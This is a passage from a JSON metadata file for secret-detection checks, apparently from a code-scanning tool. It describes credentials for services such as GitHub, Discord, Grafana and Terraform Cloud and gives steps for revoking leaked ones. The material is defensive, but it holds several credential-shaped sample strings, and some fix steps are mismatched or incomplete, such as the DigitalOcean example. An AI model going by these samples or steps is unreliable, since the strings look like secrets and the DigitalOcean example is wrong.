        "url": "https://docs.bridgecrew.io/docs/git_secrets_25",
        "description": "Atlassian Oauth2 Keys\nDescription\nOAuth is an authorization protocol that contains an authentication step. OAuth allows a user (resource owner) to grant a third-party application (consumer/client) access to their information on another site (resource). This process is commonly known as the OAuth dance. Jira uses 3-legged OAuth (3LO), which means that the user is involved by authorizing access to their data on the resource (as opposed to 2-legged OAuth, where the user is not involved).\nIn Jira, a client is authenticated as the user involved in the OAuth dance and is authorized to have read and write access as that user. The data that can be retrieved and changed by the client is controlled by the user's permissions in Jira.\nThe authorization process works by getting the resource owner to grant access to their information on the resource by authorizing a request token. This request token is used by the consumer to obtain an access token from the resource. Once the client has an access token, it can use the access token to make authenticated requests to the resource until the token expires or is revoked.\nFix - Buildtime\nAtlassian Services\nYou can only delete an app if it's not installed anywhere. If your app is currently installed on a site, uninstall it.\nSelect Settings in the left menu, and select Delete app.",
        "severity": "LOW"
    },
    "CKV_SECRET_29": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_29",
        "description": "CircleCI Personal Token\nDescription\nTo use the CircleCI API or view details about your pipelines, you will need API tokens with the appropriate permissions. This document describes the types of API tokens available, as well as how to create and delete them.\nThere are two types of API token you can create within CircleCI.\nPersonal: These tokens are used to interact with the CircleCI API and grant full read and write permissions.\nProject: These tokens allow you to read/write information for specific projects. Project tokens have three scope options: Status, Read Only, and Admin. - Status tokens grant read access to the project\u2019s build statuses. Useful for embedding status badges. - Read Only tokens grant read only access to the project\u2019s API. - Admin tokens grant read and write access for the project\u2019s API.\nFix - Buildtime\nCircleCI\n\nIn the CircleCI application, go to your User settings\nClick Personal API Tokens\nClick the X in the Remove column for the token you wish to replace and confirm your deletion.\nClick the Create New Token button.\nIn the Token name field, type a new name for the old token you are rotating. It can be the same name given to the old token.\nClick the Add API Token button.\nAfter the token appears, copy and paste it to another location. You will not be able to view the token again.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_34": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_34",
        "description": "DigitalOcean Token\nDescription\nTo use the DigitalOcean API, you\u2019ll need to generate a personal access token. Personal access tokens function like ordinary OAuth access tokens. You can use them to authenticate to the API by including one in a bearer-type Authorization header with your request. \nTokens function like passwords. Do not hard code your tokens into programs where they may accidentally be released in version control and are harder to rotate. Instead, use environmental variables. If a token becomes compromised, delete it to revoke that token\u2019s access.\nFix - Buildtime\nDigitalOcean\n\nRevoke Token\nUse the access_token in your token revocation request, which is a POST request to the revoke endpoint with the appropriate parameters.\nhttps://cloud.digitalocean.com/v1/oauth/revoke\n\ncURLcurl -X GET \"https://api.digitalocean.com/v2/droplets\" \\\n  -H \"Authorization: Bearer $TOKEN\"\n",
        "severity": "LOW"
    },
    "CKV_SECRET_35": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_35",
        "description": "Discord Token\nDescription\nDiscord token provides full access to your account and is required to perform actions within Discord. It\u2019s also useful for allowing bots to do things on your behalf outside of the Discord client. If you need your Discord token, the only way to find it is via Discord\u2019s developer tools.\nFix - Buildtime\nDiscord\ncURLPOST https://discord.com/api/oauth2/token/revoke\nContent-Type: application/x-www-form-urlencoded\ndata:\n  client_id: <client_id>\n  client_secret: <client_secret>\n  token: <access_token>\n",
        "severity": "LOW"
    },
    "CKV_SECRET_36": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_36",
        "description": "Doppler API Key\nDescription\nThe API uses Doppler tokens to authenticate requests. You can generate and manage your tokens in the dashboard on the Tokens page. Tokens carry many privileges, so be sure to keep them secure! Do not store your secret tokens in an .env file or share them in publicly accessible areas such as GitHub, client-side code, etc. Personal and CLI tokens can both read and write in a workspace and service tokens are read-only in a single configuration.\nFix - Buildtime\nDoppler\nTextcurl --request POST \\\n     --url https://api.doppler.com/v3/auth/revoke \\\n     --header 'Accept: application/json' \\\n     --header 'Content-Type: application/json' \\\n     --data '\n{\n     \"token\": \"<YOUR TOKEN>\"\n}\n'\n",
        "severity": "LOW"
    },
    "CKV_SECRET_37": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_37",
        "description": "DroneCI Token\nDescription\nThe remote API uses access tokens to authorize requests. You can retrieve an access token in the Drone user interface by navigating to your user profile. Authorization to the API is performed using the HTTP Authorization header. Provide your token as the bearer token value.\nIf your repository is private or requires authentication to clone, Drone injects the credentials into your pipeline environment. Drone uses the oauth2 token associated with the repository owner as the clone credentials.\nFix - Buildtime\nDroneCI\nStep 1: Revoke the token\n\nOn the DroneCI page, click on your avatar, then Account\nClick on Security\nIn the API Tokens section, find the compromised token\nClick on Delete\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_38": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_38",
        "description": "Dropbox App Credentials\nDescription\nWhen working with the Dropbox APIs, your app will access Dropbox on behalf of your users. You'll need to have each user of your app sign into dropbox.com to grant your app permission to access their data on Dropbox. Dropbox uses OAuth 2.0, an open specification, to authorize access to a user\u2019s data. Once completed by a user, the OAuth flow returns an access token to your app. This authorization token your app and user in subsequent API calls. It should be passed with the Authorization HTTP header value of Bearer .\nFix - Buildtime\nDropbox\n/token/revoke Disables the access token used to authenticate the call. If there is a corresponding refresh token for the access token, this disables that refresh token, as well as any other access tokens for that refresh token.\nTextcurl -X POST https://api.dropboxapi.com/2/auth/token/revoke \\\n    --header \"Authorization: Bearer \"\n",
        "severity": "LOW"
    },
    "CKV_SECRET_43": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_43",
        "description": "GitHub Token\nDescription\nGitHub Personal Access Token\nPersonal access tokens (PATs) are an alternative to using passwords for authentication to GitHub when using the GitHub API or the command line. If you want to use a PAT to access resources owned by an organization that uses SAML SSO, you must authorize the PAT. \nGitHub OAuth Access Token\nGitHub's OAuth implementation supports the standard authorization code grant type and the OAuth 2.0 Device Authorization Grant for apps that don't have access to a web browser. If you want to skip authorizing your app in the standard way, such as when testing your app, you can use the non-web application flow. To authorize your OAuth app, consider which authorization flow best fits your app.\nGitHub App Token\nAfter you create a GitHub App, you'll need to generate one or more private keys. You'll use the private key to sign access token requests. You can create multiple private keys and rotate them to prevent downtime if a key is compromised or lost.\nGitHub Refresh Token\nTo enforce regular token rotation and reduce the impact of a compromised token, you can configure your GitHub App to use expiring user access tokens.  Expiring user tokens expire after 8 hours. When you receive a new user-to-server access token, the response will also contain a refresh token, which can be exchanged for a new user token and refresh token. Refresh tokens are valid for 6 months.\nFix - Buildtime\nGitHub App Token\n\nIn the upper-right corner of any page, click your profile photo, then click Settings.\nIn the \"Integrations\" section of the sidebar, click  Applications.\nClick the Authorized OAuth Apps tab.\nReview the tokens that have access to your account. For those that you don't recognize or that are out-of-date, click , then click Revoke. To revoke all tokens, click Revoke all.\n\nTextcurl \\\n  -X DELETE \\\n  -H \"Accept: application/vnd.github+json\" \\ \n  -H \"Authorization: Bearer <YOUR-TOKEN>\" \\\n  https://api.github.com/applications/Iv1.8a61f9b3a7aba766/token \\\n  -d '{\"access_token\":\"e72e16c7e42f292c6912e7710c838347ae178b4a\"}'\n",
        "severity": "LOW"
    },
    "CKV_SECRET_45": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_45",
        "description": "Google Cloud Keys\nDescription\nThe Google Cloud API key can be used to authenticate to an API. The API key associates the request with a Google Cloud project for billing and quota purposes. Because API keys do not identify the caller, they are generally used for accessing public data or resources. Many Google Cloud APIs do not accept API keys for authentication. When you use Google Cloud API keys in your applications, ensure that they are kept secure during both storage and transmission. Publicly exposing your API keys can lead to unexpected charges on your account.\nFix - Buildtime\nGoogle Cloud\n\nNavigate to APIs & Services console at https://console.cloud.google.com/apis/credentials.\nIn the main navigation panel, select Credentials to access the list of the API keys created for the selected Google Cloud Platform (GCP) project.\n3.On the Credentials page, in the API Keys section, select the API key that you want to delete, and choose DELETE button from the console top menu to remove the selected key from your GCP project. \nInside the Delete credential confirmation box, choose DELETE to confirm the removal action. The selected API key will be deleted immediately and permanently.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_46": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_46",
        "description": "Grafana Token\nDescription\nThe Grafana API key is a randomly generated string that external systems use to interact with Grafana HTTP APIs. When you create an API key, you specify a Role that determines the permissions associated with the API key. Role permissions control that actions the API key can perform on Grafana resources.\nFix - Buildtime\nGrafana\nDELETE /api/auth/keys/:id\nTextDELETE /api/auth/keys/3 HTTP/1.1\nAccept: application/json\nContent-Type: application/json\nAuthorization: Bearer eyJrIjoiT0tTcG1pUlY2RnVKZTFVaDFsNFZXdE9ZWmNrMkZYbk\n",
        "severity": "LOW"
    },
    "CKV_SECRET_47": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_47",
        "description": "Terraform Cloud API Token\nDescription\nTerraform Cloud supports three distinct types of API tokens with varying levels of access: user, team, and organization.  API tokens are displayed only once when they are created, and are obfuscated thereafter. If the token is lost, it must be regenerated.\nUser API Tokens\nUser tokens are the most flexible token type because they inherit permissions from the user they are associated with.\nTeam API Tokens\nTeam API tokens allow access to the workspaces that the team has access to, without being tied to any specific user. Each team can have one valid API token at a time, and any member of a team can generate or revoke that team's token. When a token is regenerated, the previous token immediately becomes invalid.\nOrganization API Tokens\nOrganization API tokens allow access to the organization-level settings and resources, without being tied to any specific team or user. To manage the API token for an organization, go to Organization settings > API Token and use the controls under the \"Organization Tokens\" header. Each organization can have one valid API token at a time. Only organization owners can generate or revoke an organization's token.\nFix - Buildtime\nTerraform Cloud\nDELETE /authentication-tokens/:id\nTextcurl \\\n  --header \"Authorization: Bearer $TOKEN\" \\\n  --header \"Content-Type: application/vnd.api+json\" \\\n  --request DELETE \\\n  https://app.terraform.io/api/v2/authentication-tokens/at-6yEmxNAhaoQLH1Da\n",
        "severity": "LOW"
    },
    "CKV_SECRET_48": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_48",
        "description": "Heroku Platform Key\nDescription\nHeroku is a cloud platform as a service (PaaS) supporting several programming languages. The Heroku network runs the customer's apps in virtual containers which execute on a reliable runtime environment. Heroku calls these containers \"Dynos\". These Dynos can run code written in Node, Ruby, PHP, Go, Scala, Python, Java, or Clojure. Heroku also provides custom buildpacks with which the developer can deploy apps in any other language. Heroku lets the developer scale the app instantly just by either increasing the number of dynos or by changing the type of dyno the app runs in.\nFix - Buildtime\nHeroku\nStep 1: Revoke the Key\n\nIn Heroku, click on Account Settings\nClick on API Key\nFind the compromised key and click on Revoke\n\nStep 2: Monitor for abuse",
        "severity": "LOW"
    },
    "CKV_SECRET_55": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_55",
        "description": "Notion Integration Token\nDescription\nThe Notion API uses bearer tokens to authorize requests from integrations. As an integration developer, you'll need to choose the appropriate integration type for the integration you create. Based on the integration type, you'll receive and store bearer tokens differently. For both types, an integration must send the bearer token in the HTTP Authorization request header.\nFix - Buildtime\nNotion\nStep 1: Revoke the token\n\nIn Notion, click on Integrations\nClick on Developers\nLook for the integration to revoke and click on Revoke\n",
        "severity": "LOW"
    },
    "CKV_SECRET_54": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_54",
        "description": "New Relic Key\nDescription\nNew Relic monitoring solutions use API keys to authenticate and verify user identity. The primary key is the user key (for working with NerdGraph, our GraphQL API). These keys allow only approved people in your organization to report data to New Relic, access that data, and configure features.\nFix - Buildtime\nNew Relic\nYou can view and manage most API keys from the API keys UI page, which is at one.newrelic.com/launcher/api-keys-ui.api-keys-launcher (from the account dropdown, click API keys).",
        "severity": "LOW"
    },
    "CKV_SECRET_56": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_56",
        "description": "Okta Token\nDescription\nOkta API tokens are used to authenticate requests to the Okta API just like HTTP cookies authenticate requests to the Okta Application with your browser. An API token is issued for a specific user and all requests with the token act on behalf of the user. API tokens are secrets and should be treated like passwords.\nAPI tokens are generated with the permissions of the user that created the token. If a user\u2019s permissions change, then so do the token\u2019s. Super admins, org admins, and group admins may create tokens.\nFix - Buildtime\nOkta\nTo revoke a token, click the trash icon at the right of the token information. Note that the icon is not always active:\n\nAgent tokens are revocable if the agent is not active; otherwise, you must deactivate the agent before revoking the token. Some agents such as the Okta AD Agent automatically revoke their tokens for you when you deactivate the agent.\nAPI Tokens are always revocable.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_57": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_57",
        "description": "PagerDuty Authorization Token\nDescription\nThe PagerDuty REST API supports authenticating via an account or user API token. Account API tokens have access to all of the data on an account, and can either be granted read-only access or full access to read, write, update, and delete. For PagerDuty accounts with Advanced Permissions, user API tokens have access to all of the data that the associated user account has access to. Only account administrators have the ability to generate account API tokens.\nFix - Buildtime\nPagerDuty\n\nIn the web app, navigate to Integrations  API Access Keys.\nIn the table of API access keys, select Remove next to the key you\u2019d like to delete.\nConfirm your selection in the browser alert.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_58": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_58",
        "description": "PlanetScale Token\nDescription\nPlanetScale offers a managed database platform that is designed for developers and developer workflows. The PlanetScale CLI allows developers to create development branches, open deploy requests, and make non-blocking schema changes directly from a terminal. \nPlanetScale provides the ability to create service tokens for your PlanetScale organization via the CLI or directly in the UI. Service tokens are not recommended for connecting to production databases. Instead, connect securely to your database using PlanetScale connection strings.\nFix - Buildtime\nPlanetScale\n\nGo to the service tokens page for your organization: app.planetscale.com//settings/service-tokens\nClick on the service token ID for the service token you would like to delete.\nClick on the \"Delete service token\" button in the upper right hand corner.\nConfirm deletion by clicking the \"Delete\" button in the pop-up modal.\nDeleting a service token will sever any database connections that use the given service token.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_59": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_59",
        "description": "Postman API Key\nDescription\nThe Postman API endpoints enable developers to integrate Postman within the development toolchain. Developers can add new collections, update existing collections, update environments, and add and run monitors directly through the API. This enables them to programmatically access data stored in a Postman account. They can also combine the Postman API with Newman to integrate Postman with a CI/CD workflow.\nFix - Buildtime\nPostman\n\nOpen your Postman API Keys page. \nSelect your avatar in the upper-right corner > Settings. Then select Postman API keys.\nOnce you have API keys generated you can manage them within your workspace. Select the more actions icon More actions icon next to a key to regenerate or delete it.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_21": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_21",
        "description": "Airtable API Key\nDescription\nAirtable is a spreadsheet-database hybrid, with the features of a database but applied to a spreadsheet. The fields in an Airtable table are similar to cells in a spreadsheet, but have types such as 'checkbox', 'phone number', and 'drop-down list', and can reference file attachments like images. Users can create a database, set up column types, add records, link tables to one another, collaborate, sort records and publish views to external websites.\nThe Airtable Airtable API key allows users to use our public API to create, fetch, update, and delete records in the bases you have access to in Airtable. API keys follow the same permissions that an account has in the Airtable UI.\nFix - Buildtime\nAirtable\nIf you accidentally reveal your API key, you should regenerate your API key as soon as possible at https://airtable.com/account. To delete your key, click the Delete key option. This will bring up a warning that deleting your key will break your API integrations. Click the red Yes, delete key button to confirm your key deletion.",
        "severity": "LOW"
    },
    "CKV_SECRET_22": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_22",
        "description": "Algolia API Key\nDescription\nAlgolia is a proprietary search engine offering, usable through the software as a service (SaaS) model. API keys are necessary to work with Algolia. They give you code-level access to your account, data, and index settings. Whether you\u2019re sending or updating your data, searching your index, or doing anything else with Algolia\u2019s API, you need to use a valid API key.\nFix - Buildtime\nAlgolia\nRevoking an API key makes it unusable. It\u2019s crucial to revoke any compromised key, for example, a leaked write API key, a search API key being abused. However, keep in mind that you need to update your applications to avoid breaking them when the key they use becomes invalid. \nYou can revoke an API key by deleting it from the dashboard, or through the API, with the deleteApiKey method. When deleting a main API key, you\u2019re also deleting all derived Secured API keys. You can never restore Secured API keys, even if you later restore the main key.",
        "severity": "LOW"
    },
    "CKV_SECRET_23": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_23",
        "description": "Alibaba Cloud Keys\nDescription\nAlibaba Cloud Key Management Service (KMS) provides secure and compliant key management and cryptography services to help you encrypt and protect sensitive data assets. KMS is integrated with a wide range of Alibaba Cloud services to allow you to encrypt data across the cloud and to control its distributed environment. KMS provides key usage logs via ActionTrail, supports custom key rotation, and provides HSMs that have passed FIPS 140-2 Level 3 or other relevant validation, to help you meet your regulatory and compliance needs.\nFix - Buildtime\nAlibaba\nFix - Delete\n\nLog on to the RAM console by using your Alibaba Cloud account.\nIn the left-side navigation pane, choose Identities > Users.\nOn the Users page, click the username of a specific RAM user.\nIn the User AccessKeys section of the page that appears, find the specific AccessKey pair and click Delete in 5. the Actions column.\nClick OK.\n\nFix - Rotate\n\nCreate an AccessKey pair for rotation. \nUpdate all applications and systems to use the new AccessKey pair.\nDisable the original AccessKey pair.\nConfirm that your applications and systems are properly running. If the applications and systems are properly running, the update succeeds. You can delete the original AccessKey pair.\nIf an application or system stops running, you must enable the original AccessKey pair, and repeat Step 2 to Step 4 until the update succeeds.\nDelete the original AccessKey pair. For more information, see Delete an AccessKey pair.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_26": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_26",
        "description": "Auth0 Keys\nDescription\nAll Auth0-issued JWTs have JSON Web Signatures (JWSs), meaning they are signed rather than encrypted. A JWS represents content secured with digital signatures or Message Authentication Codes (MACs) using JSON-based data structures.\nFix - Buildtime\nAuth0\nOnce issued, access tokens and ID tokens cannot be revoked in the same way as cookies with session IDs for server-side sessions.\nAs a result, tokens should be issued for relatively short periods, and then refreshed periodically if the user remains active.",
        "severity": "LOW"
    },
    "CKV_SECRET_60": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_60",
        "description": "Pulumi Access Token\nDescription\nPulumi is a modern infrastructure as code platform. It leverages existing programming languages\u2014TypeScript, JavaScript, Python, Go, .NET, Java, and markup languages like YAML\u2014and their native ecosystem to interact with cloud resources through the Pulumi SDK. A downloadable CLI, runtime, libraries, and a hosted service work together to deliver a robust way of provisioning, updating, and managing cloud infrastructure.\nOrganization Access Tokens provide Enterprise and Business Critical customers the opportunity to manage resources and stack operations for their organization independent of a single-user account.\nFix - Buildtime\nPulumi\n\nFrom the organization\u2019s homepage, follow the same steps as for a Personal Access Token:\nNavigate to Settings > Access Tokens.\nChoose Delete token from the action menu. You will be prompted in a dialog to confirm your choice.\nIf you choose to delete a token, its access will immediately be revoked and all further operations using it will fail as unauthorized.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_27": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_27",
        "description": "Bitbucket Keys\nDescription\nBitbucket Cloud REST API integrations, and Atlassian Connect for Bitbucket add-ons, can use OAuth 2.0 to access resources in Bitbucket. For obtaining access/bearer tokens, we support three of RFC-6749's grant flows, plus a custom Bitbucket flow for exchanging JWT tokens for access tokens.\nClient ID: Stores the identifier that the authorization service uses to validate a login request. You generate this value in the authorization service when you configure the authorization settings for a web application and enter an authorized redirect URI.\nClient Secret: Stores the secret or password used to validate the client ID. You generate this value in the authorization service together with the client ID.\nFix - Buildtime\nBitbucket\nAccess tokens expire in two hours. When this happens you'll get 401 responses.\nMost access token grant response therefore include a refresh token that can then be used to generate a new access token, without the need for end user participation:",
        "severity": "LOW"
    },
    "CKV_SECRET_28": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_28",
        "description": "Buildkite Agent Token\nDescription\nThe Buildkite Agent requires an agent token to connect to Buildkite and register for work. If you are an admin of your Buildkite organization, you can view the tokens on your Agents page. When you create a new organization in Buildkite, a default agent token is created. This token can be used for testing and development, but it's recommended to create new, specific tokens for each new environment.\nFix - Buildtime\nBuildkite\nTokens can be revoked using the GraphQL API with the agentTokenRevoke mutation.\nYou need to pass your agent token as the ID in the mutation. You can get the token from your Buildkite dashboard, in Agents > Reveal Agent Token, or you can retrieve a list of agent token IDs using this query:\nPHPquery GetAgentTokenID {\n  organization(slug: \"organization-slug\") {\n    agentTokens(first:50) {\n      edges {\n        node {\n          id\n          uuid\n          description\n        }\n      }\n    }\n  }\n}\n\nThen, using the token ID, revoke the agent token:\nPHPmutation {\n  agentTokenRevoke(input: {\n    id: \"token-id\",\n    reason: \"A reason\"\n  }) {\n    agentToken {\n      description\n      revokedAt\n      revokedReason\n    }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_SECRET_61": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_61",
        "description": "Python Package Index Key\nDescription\nThe Python Package Index (PyPI) stores meta-data describing distributions packaged with distutils, as well as package data like distribution files if a package author wishes. PyPI lets you submit any number of versions of your distribution to the index. If you alter the meta-data for a particular version, you can submit it again and the index will be updated.\nA PyPI API token is a string consisting of a prefix (pypi), a separator (-) and a macaroon serialized with PyMacaroonv2, which means it\u2019s the base64 of:\nFix - Buildtime\nPyPi\nSome content managers run regexes to try and identify published secrets, and ideally have them deactivated. PyPI has started integrating with such systems in order to help secure packages. For more information see: https://warehouse.pypa.io/development/token-scanning.html?highlight=secrets#token-scanning",
        "severity": "LOW"
    },
    "CKV_SECRET_30": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_30",
        "description": "Codecov API key\nDescription\nCodecov is a tool that is used to measure the test coverage of your codebase. It generally calculates the coverage ratio by examining which lines of code were executed while running the unit tests. When linking a GitHub account to Codecov, the service can be restricted to public repositories only, or be allowed to access private repositories as well.\nFix - Buildtime\nCodecov\nStep 1: Revoke the key\n\nIn Codecov, click on Settings\nClick on API in the left sidebar\nFind the API key exposed and click on Revoke\n\nStep 2: Monitor for abuse of the credential",
        "severity": "LOW"
    },
    "CKV_SECRET_31": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_31",
        "description": "Coinbase Keys\nDescription\nCoinbase, is an American publicly traded company that operates a cryptocurrency exchange platform. Coinbase is a distributed company. It is the largest cryptocurrency exchange in the United States by trading volume.\nFix - Buildtime\nCoinbase\nThe API key can be revoked from your dashboard in the API tab.",
        "severity": "LOW"
    },
    "CKV_SECRET_32": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_32",
        "description": "Confluent Keys\nDescription\nAPI keys for Confluent Cloud can be created with user and service accounts. A service account is intended to provide an identity for an application or service that needs to perform programmatic operations within Confluent Cloud. When moving to production, ensure that only service account API keys are used. Avoid user account API keys, except for development and testing. If a user leaves and a user account is deleted, all API keys created with that user account are deleted and might break applications.\nFix - Buildtime\nConfluent Cloud\n\nFrom the appropriate API Access tab for the Kafka, Schema Registry, or ksqlDB resource, select the key that you want to delete.\nClick the trash icon. The Confirm API key deletion dialog appears.\nClick Confirm.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_33": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_33",
        "description": "Databricks Authentication Token\nDescription\nTo authenticate to and access Databricks REST APIs, you can use Databricks personal access tokens or passwords. Databricks strongly recommends that you use tokens. Tokens replace passwords in an authentication flow and should be protected like passwords. To protect tokens, Databricks recommends that you store tokens in: \n\nSecret management and retrieve tokens in notebooks using the Secrets utility (dbutils.secrets).\nA local key store and use the Python keyring package to retrieve tokens at runtime.\n\nFix - Buildtime\nDatabricks\n\nFind the token ID. See Get tokens for the workspace.\nCall the delete a token API (DELETE /token-management/tokens). Pass the token ID in the path.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_39": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_39",
        "description": "Dynatrace token\nDescription\nTo be authenticated to use the Dynatrace API, you need a valid access token or a valid personal access token. Access to the API is fine-grained, meaning that you also need the proper scopes assigned to the token. See the description of each request to find out which scopes are required to use it. \nDynatrace uses a unique token format consisting of three components separated by dots (.).\ndt0c01.ST2EY72KQINMH574WMNVI7YN.G3DFPBEJYMODIDAEX454M7YWBUVEFOWKPRVMWFASS64NFH52PX6BNDVFFM572RZM\nThe part of a token composed of the prefix and public portion is a token identifier. For example dt0c01.ST2EY72KQINMH574WMNVI7YN. Token identifier can be safely displayed in the UI and can be used for logging purposes.\nFix - Buildtime\nDynatrace\nTo execute this request, you need an access token with Write API tokens (apiTokens.write) scope:\nManaged\thttps://{your-domain}/e/{your-environment-id}/api/v2/apiTokens/{id}\nSaaS: https://{your-environment-id}.live.dynatrace.com/api/v2/apiTokens/{id}\nEnvironment: ActiveGate https://{your-activegate-domain}/e/{your-environment-id}/api/v2/apiTokens/{id}",
        "severity": "LOW"
    },
    "CKV_SECRET_40": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_40",
        "description": "Elastic Email Key\nDescription\nElastic Email is a mail relay service. That is, instead of your website sending mail via its own SMTP server, outgoing email is directed through the Elastic Email service and out onto the internet. The API Key is a 96-character single GUID and it is the key to your account when trying to gain access or make API calls while outside of the User Interface. Every API call will require this key. It is unique for API connections and separate from SMTP Relay communication.\nFix - Buildtime\nElastic Email\nPermanently delete AccessToken from your Account:\nTexthttps://api.elasticemail.com/v2/accesstoken/delete?apikey=7H29A61A88F5D6F1CX5CC79IWQADW3EFC98CD5F4428W7WU2B873256BCECCDCIAP8A5C4JS6A29675XHFBED2DFCDF9I1QW&tokenName=My Token&type=\n",
        "severity": "LOW"
    },
    "CKV_SECRET_41": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_41",
        "description": "Fastly Personal Token\nDescription\nFastly's API tokens are unique authentication credentials assigned to individual users. You need to create an API token to use the Fastly API. You can use API tokens to grant applications restricted access to your Fastly account and services. For example, an engineer user could limit a token to only have access to a single service, and restrict the scope to only allow that token to purge by URL. Every Fastly user can create up to 100 API tokens.\nFix - Buildtime\nFastly\nTo delete an account API token or to revoke another user's API token as a superuser, follow the steps below:\n\nLog in to the Fastly web interface and click the Account link from the user menu. Your account information appears.\nClick the Account API tokens link. The Account API Tokens page appears with a list of tokens associated with your organization's Fastly account.\nFind the API token you want to delete and click the trash icon. A warning message appears.\nClick the Delete button to permanently delete the API token.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_42": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_42",
        "description": "FullStory API Key\nDescription\nFullStory\u2019s HTTP APIs use API keys for authentication. If you are configuring an integration or building some tools of your own that make HTTP calls, you will need a key.\nIn the FullStory UI the \u201cAll Keys\u201d tab shows you all the keys that you have permission to view. If you are an Administrator, then in addition to keys that you have created, you\u2019ll also be able to see other users\u2019 keys and legacy keys. If you are a Standard or Architect user, you will only be able to see your own keys.\nAdministrators who might be looking at a long list of keys can click the \u201cMy Keys\u201d tab to view only their own keys, or the \u201cLegacy Keys\u201d tab to view any legacy keys.\nFix - Buildtime\nFullStory\nTo delete a key, click the \u201cDelete\u201d button that appears at the end of the row where the key is displayed. When you delete a key, API calls making use of the key value will stop working immediately.\nAdministrators may delete keys for all users. Standard and Architect users may only delete their own keys.\nNote that removing or changing the permissions of a user does not affect any API keys that may have been created by that user. For example, if you change a user from \"Admin\" to \"Guest\" and wish to remove API keys they may have created, you'll need to do that at the settings page following the instructions above.",
        "severity": "LOW"
    },
    "CKV_SECRET_62": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_62",
        "description": "RapidAPI Key\nDescription\nRapidAPI is used to find, test, and connect to thousands of APIs \u2014 all with a single API key and dashboard. It allows finding APIs, embedding them into an app and tracking usage of all endpoints.\nTo connect an API to a project or application, you must have an API key to authenticate your request. Creating an app within RapidAPI generates an API key (X-RapidAPI-Key) specific to that application. You can view analytics based on the API calls you make using this app key.\nFix - Buildtime\nRapidAPI\nYou can create a new API key and delete the compromised one in a few steps from the Developer Dashboard:\n\nSelect the application with the compromised key and navigate to the Security page.\nClick \"Add New Key.\" You can also edit the API Key name if desired.\nNow it is time to test the new API key. Go to the API's Endpoints tab on the RapidAPI Hub listing and select the new API key from the X-RapidAPI-Key dropdown. Click the \"Test Endpoint\" button to ensure the new API key is working properly.\nUpdate your project with the new API key.\nReturn to the application's Security page and delete the compromised API key.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_49": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_49",
        "description": "HubSpot API Key\nDescription\nWith the HubSpot API key, developers can create custom applications with HubSpot\u2019s APIs. Each key is specific to a HubSpot account, not an individual user, and only one key is allowed at a time.\nFix - Buildtime\nHubSpot\nTo rotate your HubSpot API key:\n\nIn your HubSpot account, click the settings icon in the main navigation bar.\nIn the left sidebar menu, navigate to Integrations > API key.\nClick the Actions dropdown menu, then select Rotate key.\nClick Rotate and expire this key now. Select the reCAPTCHA checkbox. Your existing key will be deactivated and a new API key will be created.\nClick Copy and replace the deactivated API key used by your applications with this new API key.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_63": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_63",
        "description": "Readme API Key\nDescription\nReadMe offers a managed service for maintaining a documentation site. Each documentation site that you publish on ReadMe is a project. Within a project there is space for documentation, interactive API reference guides, a changelog, and many more features. Each project within your account is published separately.\nFix - Buildtime\nReadme\nIf one of your API keys has been leaked or if you have any security concerns about a particular API key, we strongly recommend you rotate out your API keys. You can do so by taking the following steps:\n\nDelete the exposed API key in your dashboard (there is a Delete option if you click the three dots on the right-hand side) \nThe \"Edit\" and \"Delete\" options that are available when you click the three dots on the right-hand side of an API key\nRe-generate a new API key in its place \nReplace any usage of the leaked API key with the new one\n",
        "severity": "LOW"
    },
    "CKV_SECRET_64": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_64",
